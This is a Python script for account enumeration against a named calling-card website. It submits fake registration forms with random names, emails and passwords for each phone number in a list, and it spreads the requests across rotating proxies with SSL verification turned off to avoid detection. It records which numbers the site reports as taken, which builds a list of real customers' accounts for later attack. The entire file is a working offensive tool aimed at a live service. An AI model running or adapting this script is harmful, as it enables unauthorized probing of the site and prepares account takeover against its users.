from concurrent.futures import ThreadPoolExecutor, as_completed
from sys import argv
from os import path
from string import digits, ascii_letters
from random import randint
from requests import post, packages
from time import sleep

packages.urllib3.disable_warnings()
packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

"""number proxies(none for none) num_threads timeout sleep"""

proxyCounter = 0
proxyLength = 0
requestTimeout = 0
sleepTime = 0
poolThread = []
finishedWriter = open('finished.txt', 'a+', buffering=1)
validWriter = open('valid.txt', 'a+', buffering=1)
proxyList = None


def accountChecker(phoneNumber):
    global proxyCounter
    postData = {'EcommProfileForm[dialing_code]': "1",
                'EcommProfileForm[dialing_country_code]': 'US',
                'EcommProfileForm[phone_number]': '(%s)+%s-%s' %
                                                  (phoneNumber[:3], phoneNumber[3:6], phoneNumber[6:]),
                'EcommProfileForm[first_name]': str(
                    ''.join((ascii_letters + digits)[randint(0, 61)]
                            for x in range(randint(7, 15)))),
                'EcommProfileForm[last_name]': str(
                    ''.join((ascii_letters + digits)[randint(0, 61)]
                            for x in range(randint(7, 15)))),
                'EcommProfileForm[username]': phoneNumber,
                'EcommProfileForm[password]': str(
                    ''.join((ascii_letters + digits)[randint(0, 61)]
                            for x in range(randint(10, 40)))),
                'EcommProfileForm[confirm_password]': None,
                'EcommProfileForm[email]': str(
                    ''.join((ascii_letters + digits)[randint(0, 61)]
                            for x in range(randint(7, 15))) + ['@outlook.com',
                                                               '@gmail.com',
                                                               '@yahoo.com',
                                                               '@yol.com'][
                        randint(0, 3)]),
                'EcommProfileForm[receipt]': '0',
                'yt0': 'Continue'}
    postData['EcommProfileForm[confirm_password]'] = postData['EcommProfileForm[password]']
    proxyCounter += 1
    proxyDict = {'http': proxyList[proxyCounter % proxyLength]}
    proxyDict['https'] = proxyDict['http']

    while True:
        try:
            resp = post('https://dolexpinlesscalling.com/register/profile',
                        data=postData, proxies=proxyDict, verify=False, timeout=requestTimeout)
            print('checked phoneNumber %s' % phoneNumber)
            if 'usernametaken' in str(resp.content):
                return True, phoneNumber
            return False, phoneNumber
        except Exception as e:
            proxyCounter += 1
            print('changing proxy for phoneNumber %s' % phoneNumber)
        proxyDict = {'http': proxyList[proxyCounter % proxyLength]}
        proxyDict['https'] = proxyDict['http']


if len(argv) == 6:
    sleepTime = int(argv[5])
    requestTimeout = int(argv[4])
    if path.isfile(argv[1]) and path.isfile(argv[2]):
        with open(argv[1], 'r') as accountReader, open(argv[2], 'r') as proxyReader:
            proxyParser = lambda valid, proxyIp, proxyPort, proxyType: proxyType + '://' + proxyIp + ':' + proxyPort
            proxyList = [proxyParser(*eval(x.strip())) for x in proxyReader.readlines()[:-1]]
            proxyLength = len(proxyList)
            executor = ThreadPoolExecutor(max_workers=int(argv[3]))
            for account in accountReader.readlines():
                account = account.strip()
                if account:
                    print('checking phoneNumber %s' % account)
                    poolThread.append(executor.submit(accountChecker, account))

            for future in as_completed(poolThread):
                result = future.result()
                validWriter.write('%s\n' % result[1]) if result[0] else None
                finishedWriter.write('%s\n' % result[1])
                validWriter.flush()
                finishedWriter.flush()
